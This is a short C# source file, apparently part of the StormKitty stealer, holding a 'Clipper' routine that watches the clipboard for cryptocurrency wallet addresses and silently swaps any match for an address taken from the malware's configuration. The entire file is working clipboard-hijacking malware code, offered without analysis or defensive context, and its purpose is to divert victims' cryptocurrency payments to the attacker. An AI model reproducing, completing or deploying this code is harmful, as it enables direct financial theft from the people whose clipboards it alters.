﻿using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Clipper
{
    internal sealed class Buffer
    {
        // Find & Replace crypto addresses in clipboard
        public static void Replace()
        {
            string buffer = StormKitty.ClipboardManager.ClipboardText;
            if (string.IsNullOrEmpty(buffer))
                return;
            foreach (KeyValuePair<string, Regex> dictonary in RegexPatterns.PatternsList)
            {
                string cryptocurrency = dictonary.Key;
                Regex pattern = dictonary.Value;
                if (pattern.Match(buffer).Success)
                {
                    string replace_to = StormKitty.Config.ClipperAddresses[cryptocurrency];
                    if (!string.IsNullOrEmpty(replace_to) && !replace_to.Contains("---") && !buffer.Equals(replace_to))
                    {
                        Clipboard.SetText(replace_to);
                        System.Console.WriteLine("Clipper replaced to " + replace_to);
                        return;
                    }
                }
            }
        }
    }
}
